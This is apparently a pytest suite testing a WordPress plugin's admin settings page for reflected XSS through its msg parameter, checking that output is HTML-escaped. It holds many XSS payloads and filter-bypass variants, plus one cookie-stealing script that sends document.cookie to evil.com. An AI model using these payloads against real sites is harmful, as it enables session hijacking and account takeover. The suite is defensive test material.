"""
Vulnerability tests for reflected XSS in Custom Admin Menu plugin.

These tests verify that the msg parameter output is properly escaped.
Tests should FAIL when vulnerable (XSS possible) and PASS when fixed.
"""

import pytest
import requests
import urllib.parse
import re

BASE_URL = "http://localhost"
ADMIN_USER = "admin"
ADMIN_PASS = "admin"

SETTINGS_PAGE = "/wp-admin/admin.php?page=adminmenu-settings"


class WordPressSession:
    """Helper class to manage WordPress authentication."""

    def __init__(self, base_url, username, password):
        self.base_url = base_url.rstrip("/")
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.logged_in = False

    def login(self):
        """Login to WordPress admin."""
        login_url = f"{self.base_url}/wp-login.php"

        # Get the login page to retrieve any nonce/cookies
        resp = self.session.get(login_url, timeout=30)

        # Perform login
        login_data = {
            "log": self.username,
            "pwd": self.password,
            "wp-submit": "Log In",
            "redirect_to": f"{self.base_url}/wp-admin/",
            "testcookie": "1"
        }

        resp = self.session.post(login_url, data=login_data, timeout=30, allow_redirects=True)

        # Check if login was successful
        if "wp-admin" in resp.url or "dashboard" in resp.text.lower():
            self.logged_in = True
            return True

        # Additional check: see if we can access admin page
        admin_resp = self.session.get(f"{self.base_url}/wp-admin/", timeout=30)
        if admin_resp.status_code == 200 and "dashboard" in admin_resp.text.lower():
            self.logged_in = True
            return True

        return False

    def get(self, path, **kwargs):
        """Make authenticated GET request."""
        url = f"{self.base_url}{path}"
        return self.session.get(url, timeout=30, **kwargs)


@pytest.fixture(scope="module")
def wp_session():
    """Create authenticated WordPress session."""
    session = WordPressSession(BASE_URL, ADMIN_USER, ADMIN_PASS)
    if not session.login():
        pytest.skip("Could not authenticate to WordPress")
    return session


class TestXSSVulnerability:
    """Test cases for XSS vulnerability in msg parameter."""

    def test_svg_onload_payload(self, wp_session):
        """Test SVG onload XSS payload - most reliable cross-browser vector."""
        payload = "<svg/onload=alert(document.domain)>"
        encoded_payload = urllib.parse.quote(payload)

        response = wp_session.get(f"{SETTINGS_PAGE}&msg={encoded_payload}")
        assert response.status_code == 200

        # If vulnerable: payload appears literally (unescaped)
        # If fixed: payload is HTML-encoded (&lt;svg instead of <svg)
        html = response.text

        # Check that the literal XSS payload is NOT in the response
        # The payload should be escaped to &lt;svg/onload=...&gt;
        assert payload not in html, \
            f"XSS vulnerability detected: unescaped SVG payload found in response"

        # Verify the escaped version is present (confirms msg was received)
        assert "&lt;svg" in html or "svg" in html.lower(), \
            "Message parameter not reflected in response at all"

    def test_script_tag_payload(self, wp_session):
        """Test basic script tag injection."""
        payload = "<script>alert(1)</script>"
        encoded_payload = urllib.parse.quote(payload)

        response = wp_session.get(f"{SETTINGS_PAGE}&msg={encoded_payload}")
        assert response.status_code == 200

        html = response.text

        # Check the literal script tag is not present
        assert "<script>alert(1)</script>" not in html, \
            "XSS vulnerability detected: unescaped script tag found"

        # The escaped version should be present
        assert "&lt;script&gt;" in html or "&lt;script" in html, \
            "Script tag should be HTML-escaped in output"

    def test_img_onerror_payload(self, wp_session):
        """Test image tag with onerror handler."""
        payload = '<img src=x onerror=alert(1)>'
        encoded_payload = urllib.parse.quote(payload)

        response = wp_session.get(f"{SETTINGS_PAGE}&msg={encoded_payload}")
        assert response.status_code == 200

        html = response.text

        # The literal payload should not appear
        assert payload not in html, \
            "XSS vulnerability detected: unescaped img onerror payload found"

    def test_body_onload_payload(self, wp_session):
        """Test body tag with onload handler."""
        payload = "<body onload=alert(1)>"
        encoded_payload = urllib.parse.quote(payload)

        response = wp_session.get(f"{SETTINGS_PAGE}&msg={encoded_payload}")
        assert response.status_code == 200

        html = response.text

        assert payload not in html, \
            "XSS vulnerability detected: unescaped body onload payload found"

    def test_iframe_injection(self, wp_session):
        """Test iframe injection attempt."""
        payload = '<iframe src="javascript:alert(1)">'
        encoded_payload = urllib.parse.quote(payload)

        response = wp_session.get(f"{SETTINGS_PAGE}&msg={encoded_payload}")
        assert response.status_code == 200

        html = response.text

        # Check that the payload is NOT rendered as actual HTML (unescaped)
        # It should be escaped to &lt;iframe...
        # Note: We specifically check for the XSS payload, not any iframe (page may have legitimate iframes)
        vulnerable = '<iframe src="javascript:alert(1)">' in html or '<iframe src=\\"javascript:alert(1)\\">' in html
        assert not vulnerable, \
            "XSS vulnerability detected: unescaped iframe payload found"

        # Verify it's properly escaped
        assert "&lt;iframe" in html, \
            "Payload should be escaped with &lt; for angle brackets"

    def test_event_handler_in_div(self, wp_session):
        """Test event handler injection in div tag."""
        payload = '<div onmouseover=alert(1)>hover me</div>'
        encoded_payload = urllib.parse.quote(payload)

        response = wp_session.get(f"{SETTINGS_PAGE}&msg={encoded_payload}")
        assert response.status_code == 200

        html = response.text

        # Check that the div tag is NOT rendered as actual HTML
        # When properly escaped, the < becomes &lt; preventing the tag from being parsed
        assert '<div onmouseover=alert(1)>' not in html, \
            "XSS vulnerability detected: unescaped event handler found"

        # Verify the escaped version exists
        assert "&lt;div" in html, \
            "Payload should be escaped with &lt; for angle brackets"

    def test_javascript_protocol(self, wp_session):
        """Test javascript: protocol in anchor tag."""
        payload = '<a href="javascript:alert(1)">click</a>'
        encoded_payload = urllib.parse.quote(payload)

        response = wp_session.get(f"{SETTINGS_PAGE}&msg={encoded_payload}")
        assert response.status_code == 200

        html = response.text

        # Check that the anchor tag is NOT rendered as actual HTML
        # The key indicator of XSS is when < is NOT escaped, creating a real HTML tag
        vulnerable = '<a href="javascript:alert(1)">' in html or '<a href=\\"javascript:alert(1)\\">' in html
        assert not vulnerable, \
            "XSS vulnerability detected: unescaped javascript protocol found"

        # Verify the escaped version exists
        assert "&lt;a" in html, \
            "Payload should be escaped with &lt; for angle brackets"

    def test_double_encoding_bypass(self, wp_session):
        """Test double URL encoding bypass attempt."""
        # %253C = double-encoded <
        payload = "%3Cscript%3Ealert(1)%3C/script%3E"

        response = wp_session.get(f"{SETTINGS_PAGE}&msg={payload}")
        assert response.status_code == 200

        html = response.text

        assert "<script>alert(1)</script>" not in html, \
            "XSS vulnerability detected: double encoding bypass successful"

    def test_mixed_case_bypass(self, wp_session):
        """Test mixed case tag bypass."""
        payload = "<ScRiPt>alert(1)</sCrIpT>"
        encoded_payload = urllib.parse.quote(payload)

        response = wp_session.get(f"{SETTINGS_PAGE}&msg={encoded_payload}")
        assert response.status_code == 200

        html = response.text

        # Check case-insensitively that script tags aren't present literally
        assert payload not in html, \
            "XSS vulnerability detected: mixed case script tag found"

    def test_null_byte_bypass(self, wp_session):
        """Test null byte injection attempt."""
        payload = "<scr%00ipt>alert(1)</scr%00ipt>"

        response = wp_session.get(f"{SETTINGS_PAGE}&msg={payload}")
        assert response.status_code == 200

        html = response.text

        # Should not execute as script
        assert "alert(1)" not in html or "&lt;" in html, \
            "Potential null byte bypass vulnerability"

    def test_quote_escaping(self, wp_session):
        """Test that quotes are properly escaped."""
        payload = '"><script>alert(1)</script><"'
        encoded_payload = urllib.parse.quote(payload)

        response = wp_session.get(f"{SETTINGS_PAGE}&msg={encoded_payload}")
        assert response.status_code == 200

        html = response.text

        # Check that attribute breakout isn't possible
        assert '"><script>' not in html, \
            "XSS vulnerability: quote not escaped, attribute breakout possible"

    def test_cookie_stealing_payload(self, wp_session):
        """Test realistic cookie stealing payload."""
        payload = '<script>new Image().src="http://evil.com/?c="+document.cookie</script>'
        encoded_payload = urllib.parse.quote(payload)

        response = wp_session.get(f"{SETTINGS_PAGE}&msg={encoded_payload}")
        assert response.status_code == 200

        html = response.text

        # Check for script tag and document.cookie (with or without escaped quotes)
        vulnerable = '<script>new Image()' in html or 'document.cookie</script>' in html
        assert not vulnerable, \
            "XSS vulnerability detected: cookie stealing payload not escaped"

    def test_dom_manipulation_payload(self, wp_session):
        """Test DOM manipulation payload."""
        payload = '<script>document.body.innerHTML="hacked"</script>'
        encoded_payload = urllib.parse.quote(payload)

        response = wp_session.get(f"{SETTINGS_PAGE}&msg={encoded_payload}")
        assert response.status_code == 200

        html = response.text

        # Check for script tag with innerHTML (with or without escaped quotes)
        vulnerable = '<script>document.body.innerHTML' in html or 'innerHTML=\\"hacked\\"</script>' in html
        assert not vulnerable, \
            "XSS vulnerability detected: DOM manipulation payload not escaped"


class TestEscapingBehavior:
    """Verify correct escaping behavior after fix.

    These tests check if special characters are properly escaped.
    In a VULNERABLE state, these tests should FAIL because characters are NOT escaped.
    In a FIXED state, these tests should PASS because characters ARE escaped.
    """

    def test_angle_brackets_escaped(self, wp_session):
        """Verify < and > are converted to HTML entities."""
        payload = "<test>"
        encoded_payload = urllib.parse.quote(payload)

        response = wp_session.get(f"{SETTINGS_PAGE}&msg={encoded_payload}")
        html = response.text

        # Should contain escaped version, NOT the literal angle brackets
        assert "&lt;test&gt;" in html, \
            "Angle brackets should be escaped to &lt; and &gt;"

    def test_ampersand_escaped(self, wp_session):
        """Verify & is converted to &amp;"""
        payload = "Tom & Jerry"
        encoded_payload = urllib.parse.quote(payload)

        response = wp_session.get(f"{SETTINGS_PAGE}&msg={encoded_payload}")
        html = response.text

        # In fixed state, & should be escaped to &amp;
        # Check that "Tom &amp; Jerry" appears in the HTML (escaped ampersand)
        # We can verify by checking the escaped version appears
        assert "Tom &amp; Jerry" in html, \
            "Ampersand should be escaped to &amp; in output"

    def test_single_quote_escaped(self, wp_session):
        """Verify single quotes in HTML context are properly escaped."""
        # Test with a payload that uses single quotes within HTML tags
        payload = "<img src='x' onerror='alert(1)'>"
        encoded_payload = urllib.parse.quote(payload)

        response = wp_session.get(f"{SETTINGS_PAGE}&msg={encoded_payload}")
        html = response.text

        # In vulnerable state, the img tag with onerror should appear (possibly with escaped quotes)
        # In fixed state, it should be escaped to &lt;img...
        # Check for img tag appearing as HTML element (not escaped)
        vulnerable = "<img src=" in html and "onerror=" in html
        assert not vulnerable, \
            "XSS vulnerability: single-quoted img onerror payload not escaped"

    def test_double_quote_escaped(self, wp_session):
        """Verify double quotes in HTML context are properly escaped."""
        # Test with a payload that uses double quotes within HTML tags
        payload = '<input type="text" onfocus="alert(1)" autofocus>'
        encoded_payload = urllib.parse.quote(payload)

        response = wp_session.get(f"{SETTINGS_PAGE}&msg={encoded_payload}")
        html = response.text

        # In vulnerable state, the input tag should appear unescaped as actual HTML element
        # In fixed state, it should be escaped to &lt;input...
        # Check that the exact malicious input tag doesn't appear as HTML
        # Note: WordPress has legitimate input elements, so we check for our specific payload
        vulnerable = '<input type="text" onfocus="alert(1)"' in html or '<input type=\\"text\\" onfocus=\\"alert(1)\\"' in html
        assert not vulnerable, \
            "XSS vulnerability: double-quoted input onfocus payload not escaped"

        # Verify it's properly escaped
        assert "&lt;input" in html, \
            "Payload should be escaped with &lt; for angle brackets"
